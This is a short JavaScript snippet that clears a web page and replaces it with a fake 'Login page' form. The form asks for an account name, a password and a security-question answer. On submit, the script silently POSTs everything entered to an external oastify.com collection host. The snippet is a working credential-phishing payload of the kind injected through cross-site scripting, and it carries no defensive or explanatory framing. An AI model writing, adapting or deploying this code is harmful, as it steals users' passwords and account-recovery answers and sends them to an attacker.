// Clear all the contents of the page
document.body.innerHTML = '';

// Create a title
const loginTitle = document.createElement("h2"); 
loginTitle.textContent = "Login page";
document.body.appendChild(loginTitle);

// Create a form (use a unique name)
const customLoginForm = document.createElement("form");
customLoginForm.id = "customLoginForm"; 

// Input field creation function (extract common logic)
function createFormField(form, labelText, name, type = "text") {
  form.appendChild(document.createTextNode(labelText));
  const input = document.createElement("input");
  input.type = type;
  input.name = name;
  input.required = true;
  form.appendChild(input);
  form.appendChild(document.createElement("br"));
  return input;
}

// Create each input field
createFormField(customLoginForm, "account:", "username");
createFormField(customLoginForm, "password:", "password", "password");
createFormField(customLoginForm, "The answer of your question?", "answer");

// Add spacing
customLoginForm.appendChild(document.createElement("br"));

// Submit button (use a specific name)
const formSubmitButton = document.createElement("button");
formSubmitButton.type = "submit";
formSubmitButton.textContent = "Submit";
customLoginForm.appendChild(formSubmitButton);

// Add the form to the page
document.body.appendChild(customLoginForm);

// Event listener (use a unique function name)
customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
  e.preventDefault();

  const formData = new FormData(customLoginForm);
  
  // Send request (can be kept or modified as needed)
  fetch("https://b7jwmq0solbm3iayir7geenj0a61urig.oastify.com", {
    method: "POST",
    body: formData
  });
});
